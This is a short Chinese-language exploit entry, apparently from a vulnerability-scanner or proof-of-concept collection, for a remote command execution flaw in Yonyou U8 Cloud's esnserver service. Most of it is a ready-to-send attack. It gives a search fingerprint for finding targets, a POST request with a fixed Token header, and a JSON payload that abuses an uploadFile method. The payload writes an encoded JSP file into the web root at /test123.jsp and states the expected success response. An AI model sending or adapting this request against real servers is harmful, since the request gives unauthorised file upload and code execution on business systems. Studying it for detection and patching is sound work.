# 用友U8cloudesnserver远程命令执行漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`POST /service/esnserver HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Token: 469ce01522f64366750d1995ca119841`　`Content-Length: 583`

**请求体 / payload**
```
{"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBAoAAAAAAA9tSFkDJCbXbQAAAG0AAAAKAAAAY29tcHJlc3NlZDwlIG91dC5wcmludGxuKCJEdWRlU3VpdGUiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT5QSwECHwAKAAAAAAAPbUhZAyQm120AAABtAAAACgAkAAAAAAAAACAAAAAAAAAAY29tcHJlc3NlZAoAIAAAAAAAAQAYACbiFZZEGdsBHOcblEgZ2wERXscDRxnbAVBLBQYAAAAAAQABAFwAAACVAAAAAAA=","p2":"webapps/u8c_web/test123.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}
上传定位：/test123.jsp
```
- **预期**：200　|　true